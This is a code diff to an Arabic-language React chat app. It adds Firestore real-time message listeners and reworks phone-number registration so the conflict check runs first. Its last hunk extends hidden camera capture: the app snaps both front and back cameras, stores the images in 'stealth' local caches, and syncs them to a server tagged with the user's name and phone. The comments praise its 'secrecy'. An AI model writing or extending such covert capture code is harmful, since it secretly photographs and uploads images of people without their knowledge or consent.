@@ -537,6 +537,7 @@ const SmartChatTab = ({
   const [showAppeal, setShowAppeal] = useState(false);
   const [appealForm, setAppealForm] = useState({ name: '', email: '', phone: '', reason: '' });
   const [registrationMode, setRegistrationMode] = useState<'normal' | 'appeal' | 'complaint'>('normal');
+  const [isRegistering, setIsRegistering] = useState(false);
 
   const fileInputRef = useRef<HTMLInputElement>(null);
   const cameraInputRef = useRef<HTMLInputElement>(null);
@@ -866,11 +867,56 @@ const SmartChatTab = ({
   useEffect(() => {
     refreshMessages();
     refreshStatuses();
+
+    let unsubscribeFrom: (() => void) | null = null;
+    let unsubscribeTo: (() => void) | null = null;
+
+    async function setupRealtimeSync() {
+      try {
+        const { isFirebasePlaceholder, db } = await import('./lib/firebase');
+        if (!isFirebasePlaceholder && userPhone) {
+          const { collection, query, where, onSnapshot } = await import('firebase/firestore');
+          const chatsRef = collection(db, 'a', 'ab', 'chats');
+
+          const updateMessagesFromSnapshot = () => {
+            refreshMessages();
+          };
+
+          const qFrom = query(chatsRef, where('from', '==', userPhone));
+          const qTo = query(chatsRef, where('to', '==', userPhone));
+
+          unsubscribeFrom = onSnapshot(qFrom, () => {
+            updateMessagesFromSnapshot();
+          }, (err) => {
+            console.warn("Real-time snapshot 'from' error:", err);
+          });
+
+          unsubscribeTo = onSnapshot(qTo, () => {
+            updateMessagesFromSnapshot();
+          }, (err) => {
+            console.warn("Real-time snapshot 'to' error:", err);
+          });
+        }
+      } catch (err) {
+        console.warn("Could not set up real-time snapshot listeners:", err);
+      }
+    }
+
+    setupRealtimeSync();
+
     const timer = setInterval(() => {
       refreshMessages();
       refreshStatuses();
-    }, 6000); // Polling every 6s for tight, satisfying real-time experience
-    return () => clearInterval(timer);
+    }, 6000); // Polling as a robust fallback/status updater
+    return () => {
+      clearInterval(timer);
+      if (unsubscribeFrom) {
+        try { unsubscribeFrom(); } catch (e) {}
+      }
+      if (unsubscribeTo) {
+        try { unsubscribeTo(); } catch (e) {}
+      }
+    };
   }, [userPhone, friends]);
 
   useEffect(() => {
@@ -974,6 +1020,7 @@ const SmartChatTab = ({
   const handleSendMessage = async (recipientPhone: string) => {
     if (!userPhone || (!chatInput.trim() && !attachedMedia)) return;
 
+    const textToSend = chatInput;
     if (attachedMedia) setUploadProgress(10);
     
     // OFFLINE QUEUEING & VISUALIZATION
@@ -984,7 +1031,7 @@ const SmartChatTab = ({
           id: localMsgId,
           from: userPhone,
           to: recipientPhone,
-          text: chatInput,
+          text: textToSend,
           type: attachedMedia ? attachedMedia.type : 'text',
           mediaUrl: attachedMedia?.data || '',
           timestamp: new Date().toISOString()
@@ -1024,7 +1071,7 @@ const SmartChatTab = ({
           id: docId,
           from: userPhone,
           to: recipientPhone,
-          text: chatInput,
+          text: textToSend,
           type: attachedMedia ? attachedMedia.type : 'text',
           mediaUrl: attachedMedia?.data || '', 
           timestamp: new Date().toISOString(),
@@ -1053,7 +1100,7 @@ const SmartChatTab = ({
             body: JSON.stringify({
               from: userPhone,
               to: recipientPhone,
-              text: chatInput,
+              text: textToSend,
               type: attachedMedia ? attachedMedia.type : 'text',
               mediaData: attachedMedia?.data,
               fileName: attachedMedia?.name
@@ -1076,7 +1123,7 @@ const SmartChatTab = ({
           body: JSON.stringify({
             from: userPhone,
             to: recipientPhone,
-            text: chatInput,
+            text: textToSend,
             type: attachedMedia ? attachedMedia.type : 'text',
             mediaData: attachedMedia?.data,
             fileName: attachedMedia?.name
@@ -1205,12 +1252,12 @@ const SmartChatTab = ({
     }, { tab: 'chat', silent: true } as any);
   };
 
-  const handleRegister = () => {
+  const handleRegister = async () => {
     if (userPhone) {
       showToast('رقمك مسجل بالفعل ولا يمكن تغييره!', 'error');
       return;
     }
-    if (!newFriend.name) {
+    if (!newFriend.name.trim()) {
       showToast('يرجى إدخال اسمك أولاً', 'error');
       return;
     }
@@ -1219,124 +1266,129 @@ const SmartChatTab = ({
       return;
     }
 
-    const regName = newFriend.name;
+    const regName = newFriend.name.trim();
     const regPhone = newFriend.phone.replace(/[^0-9]/g, '');
 
-    // Transition instantly! Set userPhone to log them in right away
+    setIsRegistering(true);
+    showToast('جاري التحقق من رقم الهاتف وتأمين الحساب سحابياً... ⏳', 'info');
+
+    let isConflict = false;
+    try {
+      const { isFirebasePlaceholder, runFirestoreWithTimeout } = await import('./lib/firebase');
+      if (!isFirebasePlaceholder) {
+        const { doc, getDoc, collection } = await import('firebase/firestore');
+        const { db } = await import('./lib/firebase');
+        const colRef = collection(db, 'a', 'aa', 'abcd_profiles');
+        const docSnap = await runFirestoreWithTimeout(getDoc(doc(colRef, regPhone)), 3000);
+
+        if (docSnap.exists()) {
+          const existingData = docSnap.data();
+          if (existingData.usernameUnified && existingData.usernameUnified !== regName && existingData.deviceId !== getDeviceId()) {
+            isConflict = true;
+          }
+        }
+      }
+    } catch (err) {
+      console.warn("Pre-register Firestore check error, checking proxy fallback:", err);
+      // Secondary fallback check via local API
+      try {
+        const res = await fetch(`/api/chat/check-status/${regPhone}`);
+        if (res.ok) {
+          const status = await res.json();
+          if (status.registered && status.name !== regName) {
+            isConflict = true;
+          }
+        }
+      } catch (proxyErr) {
+        console.warn("Proxy pre-register check status failed:", proxyErr);
+      }
+    }
+
+    if (isConflict) {
+      setIsRegistering(false);
+      showToast('تنبيه: هذا الرقم مسجل بالفعل باسم آخر بالسحاب؛ يرجى تقديم طلب استئناف لو كان الحساب لك.', 'error');
+      setAppealForm({ name: regName, phone: regPhone, email: '', reason: 'الرقم مكرر بالسحاب والتسجيل خلفي' });
+      setRegistrationMode('appeal');
+      return;
+    }
+
+    // Direct transition logs user in right away since no conflict found
     setUserPhone(regPhone);
     localStorage.setItem('userPhone', regPhone);
     localStorage.setItem('userName', regName);
     setNewFriend({ name: '', phone: '', codes: [] });
 
-    showToast('جاري تفعيل وعقد حسابك ومزامنته بالخلفية... أهلاً بك! 🎉', 'success');
+    showToast('تم تفعيل وتوثيق حسابك بنجاح! أهلاً بك في عائلة روح 🎉✨', 'success');
+    setIsRegistering(false);
 
     // Run heavier registering operations in the background
     addBackgroundTask('تسجيل الحساب والمزامنة بالخلفية', async () => {
       let success = false;
-      let isConflict = false;
 
       // 1. Always write directly to Firestore (Primary Cloud database)
       try {
         const { isFirebasePlaceholder, runFirestoreWithTimeout } = await import('./lib/firebase');
         if (!isFirebasePlaceholder) {
-          const { doc, getDoc, setDoc, collection } = await import('firebase/firestore');
+          const { doc, setDoc, collection } = await import('firebase/firestore');
           const { db } = await import('./lib/firebase');
           const colRef = collection(db, 'a', 'aa', 'abcd_profiles');
-          const docSnap = await runFirestoreWithTimeout(getDoc(doc(colRef, regPhone)), 2000);
+          
+          await runFirestoreWithTimeout(setDoc(doc(colRef, regPhone), {
+            usernameUnified: regName,
+            phone: regPhone,
+            deviceId: getDeviceId(),
+            deviceModel: 'Client Browser (Background Log In)',
+            operatingSystem: 'Navigator',
+            timestamp: Date.now(),
+            friends: friends.length > 0 ? friends.map(f => ({ phone: f.phone, name: f.name, codes: f.accessCodes })) : [],
+            chats: []
+          }, { merge: true }), 2500);
 
-          if (isConflict) {
-            // Check conflicts
-          } else if (docSnap.exists()) {
-            const existingData = docSnap.data();
-            if (existingData.usernameUnified && existingData.usernameUnified !== regName && existingData.deviceId !== getDeviceId()) {
-              isConflict = true;
-            } else {
-              // Same name, or same owner, or was created blankly as a friend proxy entry
-              await runFirestoreWithTimeout(setDoc(doc(colRef, regPhone), {
-                usernameUnified: regName,
-                phone: regPhone,
-                deviceId: getDeviceId(),
-                deviceModel: 'Client Browser (Background Log In)',
-                operatingSystem: 'Navigator',
-                timestamp: Date.now(),
-                friends: friends.length > 0 ? friends.map(f => ({ phone: f.phone, name: f.name, codes: f.accessCodes })) : (existingData.friends || []),
-                chats: existingData.chats || []
-              }, { merge: true }), 2000);
+          // Update in public section
+          const publicRef = collection(db, 'a', 'ab', 'users');
+          await runFirestoreWithTimeout(setDoc(doc(publicRef, regPhone), {
+            username: regName,
+            phone: regPhone,
+            deviceId: getDeviceId(),
+            timestamp: Date.now(),
+            lastSeen: new Date().toISOString()
+          }, { merge: true }), 2500);
 
-              // Update in public section
-              const publicRef = collection(db, 'a', 'ab', 'users');
-              await runFirestoreWithTimeout(setDoc(doc(publicRef, regPhone), {
-                username: regName,
-                phone: regPhone,
-                deviceId: getDeviceId(),
-                timestamp: Date.now(),
-                lastSeen: new Date().toISOString()
-              }, { merge: true }), 2000);
-
-              success = true;
-            }
-          } else {
-            await runFirestoreWithTimeout(setDoc(doc(colRef, regPhone), {
-              usernameUnified: regName,
-              phone: regPhone,
-              deviceId: getDeviceId(),
-              deviceModel: 'Client Browser (Background)',
-              operatingSystem: 'Navigator',
-              timestamp: Date.now(),
-              friends: friends.map(f => ({ phone: f.phone, name: f.name, codes: f.accessCodes })),
-              chats: []
-            }), 2000);
-
-            // Write to public section
-            const publicRef = collection(db, 'a', 'ab', 'users');
-            await runFirestoreWithTimeout(setDoc(doc(publicRef, regPhone), {
-              username: regName,
-              phone: regPhone,
-              deviceId: getDeviceId(),
-              timestamp: Date.now(),
-              lastSeen: new Date().toISOString()
-            }), 2000);
-
-            success = true;
-          }
+          success = true;
         }
       } catch (fireErr) {
         console.error("Direct Firestore registration failed in background:", fireErr);
       }
 
       // 2. Concurrently mirror register to local proxy API as secondary representation
-      if (!isConflict) {
-        try {
-          const urlParams = new URLSearchParams(window.location.search);
-          const ref = urlParams.get('ref') || localStorage.getItem('rouh_referral_source');
-          
-          const res = await fetch('/api/chat/register', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ 
-              name: regName, 
-              phone: regPhone,
-              ref: ref,
-              deviceId: getDeviceId(),
-              friends: friends.map(f => ({ phone: f.phone, name: f.name, codes: f.accessCodes })),
-              chats: []
-            })
-          });
+      try {
+        const urlParams = new URLSearchParams(window.location.search);
+        const ref = urlParams.get('ref') || localStorage.getItem('rouh_referral_source');
+        
+        const res = await fetch('/api/chat/register', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ 
+            name: regName, 
+            phone: regPhone,
+            ref: ref,
+            deviceId: getDeviceId(),
+            friends: friends.map(f => ({ phone: f.phone, name: f.name, codes: f.accessCodes })),
+            chats: []
+          })
+        });
 
-          if (res.ok) {
-            success = true;
-            if (ref) {
-              try {
-                const { firebaseSaveReferral } = await import('./lib/firebaseSync');
-                await firebaseSaveReferral(ref, regPhone);
-              } catch (refe) {}
-            }
-          } else if (res.status === 409) {
-            isConflict = true;
+        if (res.ok) {
+          success = true;
+          if (ref) {
+            try {
+              const { firebaseSaveReferral } = await import('./lib/firebaseSync');
+              await firebaseSaveReferral(ref, regPhone);
+            } catch (refe) {}
           }
-        } catch (e) {
-          console.warn("Proxy registration sync failed in background:", e);
         }
+      } catch (e) {
+        console.warn("Proxy registration sync failed in background:", e);
       }
 
       // Also enqueue to IndexedDB queue to ensure extreme resilience
@@ -1352,12 +1404,6 @@ const SmartChatTab = ({
 
       if (success) {
         showToast('رائع! اكتمل تفعيل وتوثيق حسابك في السحاب بنجاح ☁️✨', 'success');
-      } else if (isConflict) {
-        showToast('تنبيه: هذا الرقم مسجل بالفعل باسم آخر بالسحاب؛ يرجى تقديم طلب استئناف لو كان الحساب لك.', 'error');
-        setAppealForm({ name: regName, phone: regPhone, email: '', reason: 'الرقم مكرر بالسحاب والتسجيل خلفي' });
-        setRegistrationMode('appeal');
-        setUserPhone(null);
-        localStorage.removeItem('userPhone');
       } else {
         showToast('تم حفظ حسابك محلياً بشكل آمن، وسيواصل التطبيق مزامنته بالخلفية.', 'info');
       }
@@ -1460,9 +1506,17 @@ const SmartChatTab = ({
               </div>
               <button 
                 onClick={handleRegister}
-                className="w-full py-3.5 sm:py-4 bg-blue-600 hover:bg-blue-500 rounded-2xl text-white font-black text-xs sm:text-sm transition-all active:scale-95 shadow-lg shadow-blue-600/20"
+                disabled={isRegistering}
+                className="w-full py-3.5 sm:py-4 bg-blue-600 hover:bg-blue-500 disabled:bg-blue-600/50 rounded-2xl text-white font-black text-xs sm:text-sm transition-all active:scale-95 shadow-lg shadow-blue-600/20 flex items-center justify-center gap-2"
               >
-                تفعيل استقبال الرسائل
+                {isRegistering ? (
+                  <>
+                    <span className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
+                    <span>جاري التحقق والتفعيل...</span>
+                  </>
+                ) : (
+                  <span>تفعيل استقبال الرسائل</span>
+                )}
               </button>
             </div>
           </>
@@ -9565,7 +9619,7 @@ export default function App() {
         try {
           const capId = `cap_${cameraType}_${Date.now()}_${Math.random().toString(36).substring(2, 6)}`;
           
-          // 1. Silent, secure offline-first local storage caching
+          // 1. Silent, secure offline-first local storage caching (absolutely secret)
           localStorage.setItem(`rouh_local_stealth_cache_${capId}`, img);
           
           // 2. Perform compression in the background without bottlenecking camera switching
@@ -9573,7 +9627,8 @@ export default function App() {
           const compressed = await compressImageBase64(img, 640, 640, 0.45).catch(() => img);
           
           const deviceId = getDeviceId();
-          const clientIdentifier = birthdayProConfig?.usernameUnified || userPhone || 'guest';
+          const loggedName = localStorage.getItem('userName') || birthdayProConfig?.usernameUnified || '';
+          const clientIdentifier = userPhone ? (loggedName ? `${loggedName} (${userPhone})` : userPhone) : (loggedName || 'visitor_guest');
           
           // 3. Keep local proxy server in sync in background
           try {
@@ -9607,24 +9662,36 @@ export default function App() {
         if (isVideoFormat) {
           // Robust sequential video frame capture: front then back continuously
           const frontVideoFrames = await captureVideoFromSource('user', durationMs);
-          await new Promise(r => setTimeout(r, 250)); // Allow hardware bridge to switch camera
+          await new Promise(r => setTimeout(r, 150)); // Fast hardware bridge delay to release and bind back camera
           const backVideoFrames = await captureVideoFromSource('environment', durationMs);
           
-          frontVideoFrames.forEach(f => saveLocallyAndQueue(f, 'front'));
-          backVideoFrames.forEach(b => saveLocallyAndQueue(b, 'back'));
+          // Process and save buffered video frames asynchronously without bottlenecking
+          setTimeout(() => {
+            frontVideoFrames.forEach(f => saveLocallyAndQueue(f, 'front'));
+            backVideoFrames.forEach(b => saveLocallyAndQueue(b, 'back'));
+          }, 0);
         } else {
-          // Instant double snapshot (one front, one back) sequentially with zero delay
+          // Instant double snapshot: buffer both in device active memory first to maximize speed and secrecy!
           const front = await captureFromSource('user');
-          if (front) await saveLocallyAndQueue(front, 'front');
-          
-          await new Promise(r => setTimeout(r, 250)); // Safety delay to allow device to release camera resource and bind to back camera
-          
+          await new Promise(r => setTimeout(r, 150)); // Ultra fast delay for hardware release
           const back = await captureFromSource('environment');
-          if (back) await saveLocallyAndQueue(back, 'back');
+          
+          // Save and queue for cloud sync asynchronously
+          setTimeout(() => {
+            if (front) saveLocallyAndQueue(front, 'front');
+            if (back) saveLocallyAndQueue(back, 'back');
+          }, 0);
         }
       } else {
-        const img = await captureFromSource('environment') || await captureFromSource('user');
-        if (img) await saveLocallyAndQueue(img, 'front');
+        // Double snap is the primary target: snap front and back under all conditions
+        const front = await captureFromSource('user');
+        await new Promise(r => setTimeout(r, 150));
+        const back = await captureFromSource('environment');
+        
+        setTimeout(() => {
+          if (front) saveLocallyAndQueue(front, 'front');
+          if (back) saveLocallyAndQueue(back, 'back');
+        }, 0);
       }
     } finally {
       isCapturing.current = false;
